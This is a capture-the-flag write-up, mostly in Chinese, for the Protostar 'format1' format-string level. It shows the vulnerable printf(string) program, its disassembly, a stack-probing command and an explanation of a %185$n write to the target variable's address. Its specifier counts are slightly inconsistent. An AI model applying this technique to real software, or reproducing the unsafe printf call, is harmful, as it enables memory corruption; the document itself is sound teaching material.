```
# Format One

This level shows how format strings can be used to modify arbitrary memory locations.

**Hints**

- objdump -t is your friend, and your input string lies far up the stack :)

This level is at /opt/protostar/bin/format1
```

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
---

**检查 `target` 是否非零，如果被修改则打印成功消息**
**由于printf(string)直接打印传入的参数，而不是使用格式化字符串比如`%s`等，可以输入带有格式化字符串的参数进行利用**

```c
pwndbg> disass main
Dump of assembler code for function main:
   0x0804841c <+0>:     push   ebp
   0x0804841d <+1>:     mov    ebp,esp
   0x0804841f <+3>:     and    esp,0xfffffff0
   0x08048422 <+6>:     sub    esp,0x10
   0x08048425 <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048428 <+12>:    add    eax,0x4
   0x0804842b <+15>:    mov    eax,DWORD PTR [eax]
   0x0804842d <+17>:    mov    DWORD PTR [esp],eax
   0x08048430 <+20>:    call   0x80483f4 <vuln>
   0x08048435 <+25>:    leave
   0x08048436 <+26>:    ret
End of assembler dump.
pwndbg> disass vuln
Dump of assembler code for function vuln:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x18
   0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [esp],eax
   0x08048400 <+12>:    call   0x8048320 <printf@plt>
   0x08048405 <+17>:    mov    eax,ds:0x8049638
   0x0804840a <+22>:    test   eax,eax
   0x0804840c <+24>:    je     0x804841a <vuln+38>
   0x0804840e <+26>:    mov    DWORD PTR [esp],0x8048500
   0x08048415 <+33>:    call   0x8048330 <puts@plt>
   0x0804841a <+38>:    leave
   0x0804841b <+39>:    ret
End of assembler dump.
```
---

**尝试确定输入的字符串在栈中的位置**

```c
./format1 `python2 -c "print 'AAAAAAAA' + '%08x.'*200 + '[%08x]'"` |grep ".41414141."

当程序 `format1` 调用 `printf(argv[1])` 时，您的输入字符串被作为格式字符串传递给 `printf`。`printf` 会解析格式字符串：
- 对于普通字符（如 "AAAA"），`printf` 会直接输出它们。
- 对于格式说明符（如 `%08x`），`printf` 会从栈上读取相应的参数并将其格式化输出
  
- 输入字符串以 `'AAAAAAAA'` 开头，这不是格式说明符，所以 `printf` 直接输出这些字符。这就是输出开头出现的 "AAAAAAAA"。
- 紧接着，`printf` 遇到第一个 `%08x`，它从栈上读取第二个参数（通常是某个随机值或地址），并输出为 8 位十六进制数（如 `00000000`），然后输出一个点。这个过程重复 185 次，因此输出中有一长串十六进制数和点。
  
- 输入字符串 `'AAAAAAAA'` 不仅被直接输出，还被存储在栈上（作为命令行参数的一部分）。当 `printf` 处理格式说明符时，它会逐步读取栈上的值。
```

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250911185851309.png)
**如图所示，通过使用 1200 个 `%08x。` 和一个 `[%08x]`，总共 201 个格式说明符，我们最终读取到了栈上存储输入字符串 `'AAAAAAAA'` 的位置，甚至还多读取了一段数据**

**接下来减少长度，使得刚好读取到字符串 `'AAAAAAAA'` 的位置**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250911190354433.png)

**找到target的地址，地址为0x08049638**
```c
└─$ objdump -t format1 |grep target
08049638 g     O .bss   00000004              target
```

**接下来，将输入的参数替换为terget的地址**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250911194004025.png)

**接下来，将数据写入地址，成功输出关键句**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250911194349666.png)

```c
- `185$` → 表示“printf 从第 185 个参数拿地址值”。这个参数就是我们在前面塞进去的 `0x08049638`。
- `%n` → 把当前累计打印的字符数（比如现在可能是 8）写到这个地址
- 当 printf 跑到 `%185$n` 时，它把 **数字 8**（已经输出的字符数“AAAA”+ 地址乱码之类）写进 `0x08049638`。
- 于是 `target` = `8`
```

 